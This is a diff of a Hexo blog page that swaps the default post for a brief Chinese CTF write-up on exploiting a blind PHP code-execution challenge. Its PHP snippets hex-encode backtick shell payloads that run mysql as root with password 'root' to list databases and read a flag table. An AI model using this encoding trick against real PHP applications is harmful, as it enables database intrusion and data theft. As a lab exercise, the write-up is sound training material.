@@ -10,7 +10,7 @@
     
     
     
-    <title>Hello World | Hexo</title>
+    <title>ctfphp连接数据库 | Hexo</title>
     <!-- inject:style -->
     <link href="/css/style.css" rel="stylesheet" type="text/css">
     <!-- endinject -->
@@ -161,13 +161,13 @@
     <div class="cube-content">
         <div class="cube-left">
             <div class="cube-article">
-    <h1 class="title">Hello World</h1>
+    <h1 class="title">ctfphp连接数据库</h1>
         
             <div class="cube-article-header">
                 <div class="cube-article-date">
                     <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
                     <!-- moment.js对象 -->
-                    2024-04-14
+                    2024-05-19
                 </div>
                 <div class="cube-article-tags">
     <i class="cube-icon cube-icon-tag" aria-hidden="true"></i>
@@ -177,19 +177,29 @@
             
                     <div class="cube-article-content cube-markdown">
                         
-                            <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+                            <p>1</p>
+<p>进来文件是这样的</p>
+<p><img src="/2024/05/19/ctfphp%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93/1.png" alt="ictfphp连接数据库"></p>
+<p>没回显但可以执行</p>
+<span id="more"></span>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>2</p>
+<p>可以进行编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&quot;echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;show tables;select * from F1ag_Se3Re7;&#x27;`;&quot;;</span><br><span class="line">$b=bin2hex($a);</span><br><span class="line">echo $b;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>3得出来的前面加个s</p>
+<p><img src="/2024/05/19/ctfphp%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93/2.png" alt="ictfphp连接数据库"></p>
+<p>4</p>
+<p>-p与’’不能有空格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&quot;echo `mysql -u root -p&#x27;root&#x27; -e &#x27;show databases;&#x27;`;&quot;;</span><br><span class="line">$b=bin2hex($a);</span><br><span class="line">echo $b;</span><br><span class="line">#echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;show tables;select * from F1ag_Se3Re7;&#x27;`;</span><br><span class="line">#echo `mysql -u root -p &#x27;root&#x27; -e &#x27;show databases;&#x27;`;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/05/19/ctfphp%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93/3.png" alt="ictfphp连接数据库"></p>
+<p>5</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&quot;echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;show tables;&#x27;`;&quot;;</span><br><span class="line">$b=bin2hex($a);</span><br><span class="line">echo $b;</span><br><span class="line">#echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;show tables;select * from F1ag_Se3Re7;&#x27;`;</span><br><span class="line">#echo `mysql -u root -p &#x27;root&#x27; -e &#x27;show databases;&#x27;`;   select * from F1ag_Se3Re7;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p>6</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&quot;echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;show tables;select * from F1ag_Se3Re7;&#x27;`;&quot;;</span><br><span class="line">$b=bin2hex($a);</span><br><span class="line">echo $b;</span><br><span class="line">#echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;show tables;select * from F1ag_Se3Re7;&#x27;`;</span><br><span class="line">#echo `mysql -u root -p &#x27;root&#x27; -e &#x27;show databases;&#x27;`;   select * from F1ag_Se3Re7;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
 
                     </div>
 </div>
@@ -197,14 +207,14 @@
     <div class="cube-article-nav">
         <ul>
             
-                <li class="prev">
-                    <a href="/2024/04/14/1/">
-                        <i class="cube-icon cube-prev" aria-hidden="true"></i>
-                        1
-                    </a>
-                </li>
-                
                     
+                        <li class="next">
+                            <a href="/2024/04/18/%E6%8A%A4%E7%BD%91%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/">
+                                护网基本问题
+                                    <i class="cube-icon cube-next" aria-hidden="true"></i>
+                            </a>
+                        </li>
+                        
         </ul>
     </div>
     
